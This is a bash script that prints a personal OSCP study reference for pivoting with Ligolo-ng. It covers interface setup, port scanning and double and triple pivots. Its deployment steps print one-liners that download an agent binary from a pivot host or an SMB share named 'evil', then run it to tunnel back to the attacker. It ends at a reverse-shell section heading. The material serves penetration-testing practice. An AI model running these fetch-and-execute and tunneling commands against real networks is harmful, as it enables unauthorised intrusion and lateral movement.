#!/bin/bash

# ============================================================================
# LIGOLO-NG COMPREHENSIVE PIVOT SETUP & REFERENCE
# Location: /home/alien/Desktop/OSCP/LIGOLO/tunnels.sh
# For OSCP advanced pivoting & network tunneling
# ============================================================================

# Colors - Matching NHAS color scheme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
LGRAY='\033[0;37m'
DIM='\033[2;37m'
NC='\033[0m'
BOLD='\033[1m'

ligoloup() {
    # Configuration - Always run from LIGOLO directory
    LIGOLO_DIR="/home/alien/Desktop/OSCP/LIGOLO"
    PROXY_BIN="$LIGOLO_DIR/proxy"

    # Change to LIGOLO directory (keeps all config & files in one place)
    cd "$LIGOLO_DIR" || {
        echo -e "${RED}[!]${NC} Failed to cd to $LIGOLO_DIR"
        return 1
    }

    # Clear screen and display comprehensive menu
    clear
    echo ""

    echo -e "${BOLD}=============================================="
    echo -e "  LIGOLO-NG SETUP"
    echo -e "==============================================${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # QUICK SUMMARY - shown BEFORE prompts so you can pick the right agent
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  QUICK SUMMARY - WHICH CLIENT TO USE"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}Agent naming: ${YELLOW}ligolo_{TARGET}${NC}  (e.g. ligolo_amd64, ligolo_windows_amd64.exe)"
    echo ""
    echo -e "  ${GREEN}[+]${NC} Linux x86_64      → ${YELLOW}ligolo_amd64${NC}              ${GRAY}<- most common${NC}"
    echo -e "  ${GREEN}[+]${NC} Linux aarch64     → ${YELLOW}ligolo_linux_arm64${NC}"
    echo -e "  ${GREEN}[+]${NC} Linux armv7l      → ${YELLOW}ligolo_linux_armv7${NC}"
    echo -e "  ${GREEN}[+]${NC} Linux armv6l      → ${YELLOW}ligolo_linux_armv6${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} Windows x86_64    → ${YELLOW}ligolo_windows_amd64.exe${NC}  ${GRAY}<- most common${NC}"
    echo -e "  ${GREEN}[+]${NC} Windows arm64     → ${YELLOW}ligolo_windows_arm64.exe${NC}"
    echo -e "  ${GREEN}[+]${NC} Windows armv7     → ${YELLOW}ligolo_windows_armv7.exe${NC}"
    echo -e "  ${GREEN}[+]${NC} Windows armv6     → ${YELLOW}ligolo_windows_armv6.exe${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} macOS x86_64      → ${YELLOW}ligolo_darwin_amd64${NC}"
    echo -e "  ${GREEN}[+]${NC} macOS arm64       → ${YELLOW}ligolo_darwin_arm64${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} FreeBSD x86_64    → ${YELLOW}ligolo_freebsd_amd64${NC}"
    echo -e "  ${GREEN}[+]${NC} FreeBSD arm64     → ${YELLOW}ligolo_freebsd_arm64${NC}"
    echo -e "  ${GREEN}[+]${NC} FreeBSD armv7     → ${YELLOW}ligolo_freebsd_armv7${NC}"
    echo -e "  ${GREEN}[+]${NC} FreeBSD armv6     → ${YELLOW}ligolo_freebsd_armv6${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} OpenBSD x86_64    → ${YELLOW}ligolo_openbsd_amd64${NC}"
    echo -e "  ${GREEN}[+]${NC} OpenBSD arm64     → ${YELLOW}ligolo_openbsd_arm64${NC}"
    echo -e "  ${GREEN}[+]${NC} OpenBSD armv7     → ${YELLOW}ligolo_openbsd_armv7${NC}"
    echo -e "  ${GREEN}[+]${NC} OpenBSD armv6     → ${YELLOW}ligolo_openbsd_armv6${NC}"
    echo ""
    echo -e "  ${CYAN}Target checks:${NC}"
    echo -e "  ${LGRAY}Linux/BSD : uname -s ; uname -m${NC}"
    echo -e "  ${LGRAY}Windows   : echo %PROCESSOR_ARCHITECTURE%${NC}"
    echo ""
    echo -e "  ${CYAN}Examples:${NC}"
    echo -e "  ${GRAY}x86_64  -> amd64    |  aarch64 -> arm64${NC}"
    echo -e "  ${GRAY}armv7l  -> armv7    |  armv6l  -> armv6${NC}"
    echo ""

    # Interface prompt -- accept either interface name (tun0, eth0) or a raw IP
    read -p "Interface or IP [tun0]: " INPUT_IFACE
    if [[ "${INPUT_IFACE:-tun0}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        TUNIP="${INPUT_IFACE}"
        IFACE="(manual IP)"
    else
        IFACE="${INPUT_IFACE:-tun0}"
        TUNIP=$(ip addr show "$IFACE" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        if [ -z "$TUNIP" ]; then
            echo -e "${RED}[!]${NC} Interface '$IFACE' not found or has no IP. Check: ip addr show $IFACE"
            return 1
        fi
    fi

    # Prompt for Ligolo port with default
    read -p "Enter port (default 8888): " PROXY_PORT
    PROXY_PORT=${PROXY_PORT:-8888}

    # Prompt for HTTP download port with default
    read -p "HTTP download port [80]: " HTTP_PORT
    HTTP_PORT=${HTTP_PORT:-80}

    # Agent name prompts — table shown above for reference
    read -p "Linux agent   [ligolo_amd64]: " LINUX_AGENT
    LINUX_AGENT=${LINUX_AGENT:-ligolo_amd64}

    read -p "Windows agent [ligolo_windows_amd64.exe]: " WIN_AGENT
    WIN_AGENT=${WIN_AGENT:-ligolo_windows_amd64.exe}

    echo ""
    echo -e "${BOLD}=============================================="
    echo -e "  CONFIGURATION"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} Kali IP ($IFACE): ${YELLOW}${TUNIP}${NC}"
    echo -e "  ${GREEN}[+]${NC} Interface:        ${YELLOW}${IFACE}${NC}"
    echo -e "  ${GREEN}[+]${NC} Ligolo Port:      ${YELLOW}${PROXY_PORT}${NC}"
    echo -e "  ${GREEN}[+]${NC} HTTP DL Port:     ${YELLOW}${HTTP_PORT}${NC}"
    echo -e "  ${GREEN}[+]${NC} Linux Agent:      ${YELLOW}${LINUX_AGENT}${NC}"
    echo -e "  ${GREEN}[+]${NC} Windows Agent:    ${YELLOW}${WIN_AGENT}${NC}"
    echo -e "  ${GREEN}[+]${NC} Working Dir:      ${YELLOW}${LIGOLO_DIR}${NC}"
    echo -e "  ${GREEN}[+]${NC} Config File:      ${YELLOW}${LIGOLO_DIR}/ligolo-ng.yaml${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # TUN/TAP SETUP
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  TUN/TAP SETUP (Run from Kali terminal)"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}10 interfaces total -- one pair per pivot machine (up to 5):${NC}"
    echo -e "  ${GRAY}  ligolomachineXX  -> 'start'     : ALL pivot ports via 240.0.0.X${NC}"
    echo -e "  ${GRAY}  ligolonetXX -> 'autoroute' : internal subnet behind that pivot${NC}"
    echo ""
    echo -e "  ${CYAN}# Create ligolomachineXX interfaces (one per pivot, for 'start')${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine01 2>/dev/null; sudo ip link set ligolomachine01 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine02 2>/dev/null; sudo ip link set ligolomachine02 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine03 2>/dev/null; sudo ip link set ligolomachine03 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine04 2>/dev/null; sudo ip link set ligolomachine04 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine05 2>/dev/null; sudo ip link set ligolomachine05 up 2>/dev/null${NC}"
    echo ""
    echo -e "  ${CYAN}# Each ligolomachineXX gets its own 240.0.0.X/32 route${NC}"
    echo -e "  ${YELLOW}sudo ip route replace 240.0.0.1/32 dev ligolomachine01${NC}"
    echo -e "  ${YELLOW}sudo ip route replace 240.0.0.2/32 dev ligolomachine02${NC}"
    echo -e "  ${YELLOW}sudo ip route replace 240.0.0.3/32 dev ligolomachine03${NC}"
    echo -e "  ${YELLOW}sudo ip route replace 240.0.0.4/32 dev ligolomachine04${NC}"
    echo -e "  ${YELLOW}sudo ip route replace 240.0.0.5/32 dev ligolomachine05${NC}"
    echo ""
    echo -e "  ${CYAN}# Create ligolonetXX interfaces (one per pivot, for 'autoroute')${NC}"
    echo -e "  ${GRAY}# Routes are added automatically by autoroute -- no manual routes needed${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolonet01 2>/dev/null; sudo ip link set ligolonet01 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolonet02 2>/dev/null; sudo ip link set ligolonet02 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolonet03 2>/dev/null; sudo ip link set ligolonet03 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolonet04 2>/dev/null; sudo ip link set ligolonet04 up 2>/dev/null${NC}"
    echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolonet05 2>/dev/null; sudo ip link set ligolonet05 up 2>/dev/null${NC}"
    echo ""
    echo -e "  ${CYAN}# Quick delete all (if needed)${NC}"
    echo -e "  ${LGRAY}for i in 01 02 03 04 05; do sudo ip link delete ligolomachine\$i 2>/dev/null; sudo ip link delete ligolonet\$i 2>/dev/null; done${NC}"
    echo -e "  ${LGRAY}sudo ip route del 240.0.0.1/32 dev ligolomachine01 2>/dev/null${NC}"
    echo -e "  ${LGRAY}sudo ip route del 240.0.0.2/32 dev ligolomachine02 2>/dev/null   # repeat for 03 04 05${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # STATUS CHECK
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  STATUS CHECK - Current IP, Interfaces & Routes"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}# Current tun0 IP:${NC}"
    echo -e "  ${YELLOW}$TUNIP${NC}"
    echo ""
    echo -e "  ${CYAN}# Check all machine interfaces are UP (for 'start'):${NC}"
    echo -e "  ${LGRAY}ip link show ligolomachine01${NC}"
    echo -e "  ${LGRAY}ip link show ligolomachine02${NC}"
    echo -e "  ${LGRAY}ip link show ligolomachine03${NC}"
    echo -e "  ${LGRAY}ip link show ligolomachine04${NC}"
    echo -e "  ${LGRAY}ip link show ligolomachine05${NC}"
    echo ""
    echo -e "  ${CYAN}# Check all internal interfaces are UP (for 'autoroute'):${NC}"
    echo -e "  ${LGRAY}ip link show ligolonet01${NC}"
    echo -e "  ${LGRAY}ip link show ligolonet02${NC}"
    echo -e "  ${LGRAY}ip link show ligolonet03${NC}"
    echo -e "  ${LGRAY}ip link show ligolonet04${NC}"
    echo -e "  ${LGRAY}ip link show ligolonet05${NC}"
    echo ""
    echo -e "  ${CYAN}# Or check everything at once:${NC}"
    echo -e "  ${LGRAY}ip link show | grep ligolo${NC}"
    echo ""
    echo -e "  ${CYAN}# Check 240.0.0.X routes per machine interface:${NC}"
    echo -e "  ${LGRAY}ip route | grep 240.0.0${NC}"
    echo ""
    echo -e "  ${CYAN}# Expected machine routes:${NC}"
    echo -e "  ${GRAY}240.0.0.1/32 dev ligolomachine01${NC}"
    echo -e "  ${GRAY}240.0.0.2/32 dev ligolomachine02${NC}"
    echo -e "  ${GRAY}240.0.0.3/32 dev ligolomachine03${NC}"
    echo -e "  ${GRAY}240.0.0.4/32 dev ligolomachine04${NC}"
    echo -e "  ${GRAY}240.0.0.5/32 dev ligolomachine05${NC}"
    echo ""
    echo -e "  ${CYAN}# Check autoroute-added subnet routes per internal interface:${NC}"
    echo -e "  ${LGRAY}ip route | grep ligolonet${NC}"
    echo -e "  ${GRAY}# Example: 10.129.0.0/16 dev ligolonet01${NC}"
    echo -e "  ${GRAY}#          172.16.0.0/24 dev ligolonet02${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # SESSION -> LOCALHOST MAPPING
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  SESSION -> LOCALHOST MAPPING"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}Each session gets its own dedicated interface pair:${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} Session 1 -> ${YELLOW}240.0.0.1${NC}  via ${YELLOW}ligolomachine01${NC}  |  internal subnet via ${YELLOW}ligolonet01${NC}"
    echo -e "  ${GREEN}[+]${NC} Session 2 -> ${YELLOW}240.0.0.2${NC}  via ${YELLOW}ligolomachine02${NC}  |  internal subnet via ${YELLOW}ligolonet02${NC}"
    echo -e "  ${GREEN}[+]${NC} Session 3 -> ${YELLOW}240.0.0.3${NC}  via ${YELLOW}ligolomachine03${NC}  |  internal subnet via ${YELLOW}ligolonet03${NC}"
    echo -e "  ${GREEN}[+]${NC} Session 4 -> ${YELLOW}240.0.0.4${NC}  via ${YELLOW}ligolomachine04${NC}  |  internal subnet via ${YELLOW}ligolonet04${NC}"
    echo -e "  ${GREEN}[+]${NC} Session 5 -> ${YELLOW}240.0.0.5${NC}  via ${YELLOW}ligolomachine05${NC}  |  internal subnet via ${YELLOW}ligolonet05${NC}"
    echo ""
    echo -e "  ${CYAN}HOW TO DETERMINE YOUR SESSION NUMBER:${NC}"
    echo -e "  ${GRAY}1. In ligolo console, run: tunnel_list${NC}"
    echo -e "  ${GRAY}2. Note the row number of your agent (1st = session 1, etc.)${NC}"
    echo -e "  ${GRAY}3. Use 240.0.0.X / ligolomachineXX / ligolonetXX where X matches${NC}"
    echo ""
    echo -e "  ${CYAN}Example output:${NC}"
    echo -e "  ${GRAY}| 1 | sequel\Ryan.Cooper@dc - 10.129.228.253:62784 | ligolomachine01 | Online |${NC}"
    echo -e "  ${GRAY}| 2 | sequel\Bob.Smith@dc  - 10.129.228.253:62785  | ligolomachine02 | Online |${NC}"
    echo ""
    echo -e "  ${YELLOW}-> Agent 1: 240.0.0.1 (start on ligolomachine01) + subnet (autoroute on ligolonet01)${NC}"
    echo -e "  ${YELLOW}-> Agent 2: 240.0.0.2 (start on ligolomachine02) + subnet (autoroute on ligolonet02)${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # LIGOLO CONSOLE - SETUP
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  LIGOLO CONSOLE - SETUP"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}# Connect to session 1, start tunnel on ligolomachine01${NC}"
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}1${NC}"
    echo -e "  ${YELLOW}start${NC}   ${GRAY}# when prompted: select 'ligolomachine01'${NC}"
    echo ""
    echo -e "  ${CYAN}# Connect to session 2, start tunnel on ligolomachine02${NC}"
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}2${NC}"
    echo -e "  ${YELLOW}start${NC}   ${GRAY}# when prompted: select 'ligolomachine02'${NC}"
    echo ""
    echo -e "  ${CYAN}# Verify all sessions active${NC}"
    echo -e "  ${YELLOW}tunnel_list${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # SCANNING TARGETS
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  SCANNING TARGETS (FROM KALI)"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${RED}[!]${NC} ${CYAN}Always check tunnel_list first to confirm session numbers!${NC}"
    echo ""
    echo -e "  ${CYAN}# Scan all ports on Pivot 1${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.1${NC}"
    echo ""
    echo -e "  ${CYAN}# Scan all ports on Pivot 2${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.2${NC}"
    echo ""
    echo -e "  ${CYAN}# Quick port check${NC}"
    echo -e "  ${GRAY}nc -vz 240.0.0.1 445${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # LISTENER SETUP
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  LISTENER SETUP (Advanced - specific port forwarding)"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}With 'start' running, ALL pivot ports are already accessible via 240.0.0.X.${NC}"
    echo -e "  ${GRAY}listener_add is only needed for advanced cases like relaying a port to a${NC}"
    echo -e "  ${GRAY}specific local address, or forwarding through to a second pivot's network.${NC}"
    echo ""
    echo -e "  ${CYAN}# Example: explicitly forward specific ports (rarely needed after 'start')${NC}"
    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:445 --to 127.0.0.1:445 --tcp${NC}"
    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:3389 --to 127.0.0.1:3389 --tcp${NC}"
    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:3306 --to 127.0.0.1:3306 --tcp${NC}"
    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:1433 --to 127.0.0.1:1433 --tcp${NC}"
    echo ""
    echo -e "  ${CYAN}# List all active listeners${NC}"
    echo -e "  ${LGRAY}listener_list${NC}"
    echo ""
    echo -e "  ${CYAN}# Stop a listener by ID${NC}"
    echo -e "  ${LGRAY}listener_stop --id 0${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # AFTER AGENT CONNECTS
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  AFTER AGENT CONNECTS - CHOOSE YOUR APPROACH"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${RED}[!]${NC} ${CYAN}'start'     -> select ligolomachineXX -> ALL pivot ports via 240.0.0.X${NC}"
    echo -e "  ${RED}[!]${NC} ${CYAN}'autoroute' -> select ligolonetXX -> routes internal subnet behind pivot${NC}"
    echo -e "  ${RED}[!]${NC} ${CYAN}Both run simultaneously -- each session has its own dedicated interface pair${NC}"
    echo ""

    echo -e "${BOLD}=============================================="
    echo -e "  APPROACH 1: Access ALL Pivot Ports (SSH, HTTP, SQL, RDP...)"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}Use 'start' and select the matching ligolomachineXX interface.${NC}"
    echo -e "  ${GRAY}Once started, 240.0.0.1 maps to ALL of the pivot's localhost ports.${NC}"
    echo -e "  ${GRAY}No listener_add needed -- just scan or connect directly.${NC}"
    echo ""
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}1${NC}"
    echo -e "  ${YELLOW}start${NC}   ${GRAY}# > Select interface: ligolomachine01${NC}"
    echo ""
    echo -e "  ${CYAN}# 240.0.0.1 is now the pivot's localhost -- scan everything:${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.1${NC}"
    echo -e "  ${GRAY}# Connect to any service directly, e.g.:${NC}"
    echo -e "  ${LGRAY}mysql -h 240.0.0.1 -u root -p${NC}"
    echo -e "  ${LGRAY}xfreerdp /v:240.0.0.1${NC}"
    echo -e "  ${LGRAY}evil-winrm -i 240.0.0.1${NC}"
    echo ""

    echo -e "${BOLD}=============================================="
    echo -e "  APPROACH 2: Route Internal Network Behind Pivot"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}Use 'autoroute' and select ligolonetXX for the matching session.${NC}"
    echo -e "  ${GRAY}When prompted, pick the internal subnet to route (e.g. 10.129.0.0/16).${NC}"
    echo -e "  ${GRAY}Autoroute adds the subnet route to ligolonetXX automatically.${NC}"
    echo ""
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}1${NC}"
    echo -e "  ${YELLOW}autoroute${NC}"
    echo -e "  ${GRAY}# > Select routes to add:       [pick the internal subnet shown]${NC}"
    echo -e "  ${GRAY}# > Create new or use existing? Use an existing one${NC}"
    echo -e "  ${GRAY}# > Select the interface:       ligolonet01${NC}"
    echo -e "  ${GRAY}# > Start the tunnel?           Yes${NC}"
    echo ""
    echo -e "  ${CYAN}# Kali now routes internal traffic through the pivot:${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 10.129.X.X${NC}"
    echo -e "  ${GRAY}# NOTE: 240.0.0.1 pivot ports are NOT accessible via autoroute (use Approach 1)${NC}"
    echo ""

    echo -e "${BOLD}=============================================="
    echo -e "  APPROACH 3: Both Pivot Ports AND Internal Network"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}Run 'start' on ligolomachine01 for port access, then 'autoroute'${NC}"
    echo -e "  ${GRAY}on ligolonet01 for the subnet -- same session, separate interfaces.${NC}"
    echo -e "  ${GRAY}Both tunnels run simultaneously without conflicting.${NC}"
    echo ""
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}1${NC}"
    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine01  -> 240.0.0.1 all ports live${NC}"
    echo ""
    echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# still in session 1${NC}"
    echo -e "  ${GRAY}# > Select routes:   [pick the internal subnet]${NC}"
    echo -e "  ${GRAY}# > Interface:       ligolonet01  (NOT ligolomachine01 - already in use)${NC}"
    echo -e "  ${GRAY}# > Start tunnel:    Yes${NC}"
    echo ""
    echo -e "  ${CYAN}# Verify both are active:${NC}"
    echo -e "  ${LGRAY}ip route | grep 240.0.0           # pivot ports   (ligolomachineXX)${NC}"
    echo -e "  ${LGRAY}ip route | grep ligolonet     # internal subnet (ligolonetXX)${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # DOUBLE PIVOT
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  DOUBLE PIVOT - ADDING A SECOND HOP"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}Topology:${NC}"
    echo -e "  ${GRAY}[Kali] -------- [Pivot 1] -------- [Pivot 2]${NC}"
    echo -e "  ${GRAY}  tun0           240.0.0.1           240.0.0.2${NC}"
    echo ""
    echo -e "  ${CYAN}How it works:${NC}"
    echo -e "  ${GRAY}Pivot 2 cannot reach Kali directly. You make Pivot 1 relay the${NC}"
    echo -e "  ${GRAY}ligolo port and HTTP port back to Kali. Pivot 2 connects to Pivot 1's${NC}"
    echo -e "  ${GRAY}INTERNAL IP (not the HTB IP), which forwards everything through the${NC}"
    echo -e "  ${GRAY}already-established tunnel back to Kali's proxy.${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 1: Relay ports on Pivot 1 (stay in session 1) --${NC}"
    echo -e "  ${GRAY}# These listeners make Pivot 1 forward incoming connections${NC}"
    echo -e "  ${GRAY}# to Kali's own services through the already-established tunnel.${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC}  ${GRAY}# relay ligolo port${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT --to 127.0.0.1:$HTTP_PORT --tcp${NC}    ${GRAY}# relay download server${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp${NC}              ${GRAY}# relay SMB (optional)${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 2: Find Pivot 1's internal IP --${NC}"
    echo -e "  ${GRAY}# Run ON Pivot 1 to find the LAN IP facing Pivot 2's network.${NC}"
    echo -e "  ${GRAY}# Use THIS IP in the next step -- NOT the HTB/VPN IP.${NC}"
    echo -e "  ${LGRAY}ipconfig /all          (Windows)${NC}"
    echo -e "  ${LGRAY}ip addr show           (Linux)${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 3: Deploy agent on Pivot 2 --${NC}"
    echo -e "  ${GRAY}# Point the agent at Pivot 1's internal IP.${NC}"
    echo -e "  ${GRAY}# Pivot 1 relays the connection to Kali's proxy transparently.${NC}"
    echo -e "  ${YELLOW}# Windows:${NC}"
    printf "  ${YELLOW}copy \\\\\\\\PIVOT1_INTERNAL_IP\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s && C:\\\\Windows\\\\Temp\\\\%s -connect PIVOT1_INTERNAL_IP:%s -ignore-cert${NC}\n" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$PROXY_PORT"
    echo -e "  ${YELLOW}# Linux:${NC}"
    echo -e "  ${YELLOW}wget http://PIVOT1_INTERNAL_IP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect PIVOT1_INTERNAL_IP:$PROXY_PORT -ignore-cert${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 4: Register Pivot 2 in ligolo --${NC}"
    echo -e "  ${GRAY}# Pivot 2's agent now appears as a new session in the proxy console.${NC}"
    echo -e "  ${YELLOW}tunnel_list${NC}   ${GRAY}# confirm Pivot 2 shows up as session 2${NC}"
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}2${NC}"
    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine02  -> 240.0.0.2 all ports live${NC}"
    echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# > Select routes: [Pivot 2's internal subnet] -> Interface: ligolonet02 -> Yes${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 5: Scan Pivot 2 --${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.2${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # TRIPLE PIVOT
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  TRIPLE PIVOT - ADDING A THIRD HOP"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}Topology:${NC}"
    echo -e "  ${GRAY}[Kali] --- [Pivot 1] --- [Pivot 2] --- [Pivot 3]${NC}"
    echo -e "  ${GRAY}  tun0      240.0.0.1     240.0.0.2     240.0.0.3${NC}"
    echo ""
    echo -e "  ${CYAN}How it works:${NC}"
    echo -e "  ${GRAY}The same relay pattern repeats one level deeper. Pivot 2 now relays${NC}"
    echo -e "  ${GRAY}the ligolo and HTTP ports -- just like Pivot 1 did for Pivot 2.${NC}"
    echo -e "  ${GRAY}Pivot 3 connects to Pivot 2's internal IP, which chains back through${NC}"
    echo -e "  ${GRAY}Pivot 1 all the way to Kali's proxy. Each hop = one more relay.${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 1: Relay ports on Pivot 2 (switch to session 2) --${NC}"
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}2${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC}  ${GRAY}# relay ligolo port${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT --to 127.0.0.1:$HTTP_PORT --tcp${NC}    ${GRAY}# relay download server${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp${NC}              ${GRAY}# relay SMB (optional)${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 2: Find Pivot 2's internal IP --${NC}"
    echo -e "  ${GRAY}# Run ON Pivot 2 to find the LAN IP facing Pivot 3's network.${NC}"
    echo -e "  ${LGRAY}ipconfig /all          (Windows)${NC}"
    echo -e "  ${LGRAY}ip addr show           (Linux)${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 3: Deploy agent on Pivot 3 --${NC}"
    echo -e "  ${GRAY}# Pivot 3 connects to Pivot 2's internal IP.${NC}"
    echo -e "  ${GRAY}# Chain: Pivot 3 -> Pivot 2 -> Pivot 1 -> Kali proxy${NC}"
    echo -e "  ${YELLOW}# Windows:${NC}"
    printf "  ${YELLOW}copy \\\\\\\\PIVOT2_INTERNAL_IP\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s && C:\\\\Windows\\\\Temp\\\\%s -connect PIVOT2_INTERNAL_IP:%s -ignore-cert${NC}\n" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$PROXY_PORT"
    echo -e "  ${YELLOW}# Linux:${NC}"
    echo -e "  ${YELLOW}wget http://PIVOT2_INTERNAL_IP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect PIVOT2_INTERNAL_IP:$PROXY_PORT -ignore-cert${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 4: Register Pivot 3 in ligolo --${NC}"
    echo -e "  ${YELLOW}tunnel_list${NC}   ${GRAY}# confirm Pivot 3 shows up as session 3${NC}"
    echo -e "  ${YELLOW}session${NC}"
    echo -e "  ${YELLOW}3${NC}"
    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine03  -> 240.0.0.3 all ports live${NC}"
    echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# > Select routes: [Pivot 3's internal subnet] -> Interface: ligolonet03 -> Yes${NC}"
    echo ""
    echo -e "  ${CYAN}# -- Step 5: Scan Pivot 3 --${NC}"
    echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.3${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # NHAS REVERSE SHELL THROUGH PIVOTS
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  NHAS REVERSE SHELL THROUGH PIVOTS"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}# Step 1: Setup NHAS server on Kali${NC}"
    echo -e "  ${YELLOW}nhasup${NC}  ${GRAY}# Custom alias that handles everything${NC}"
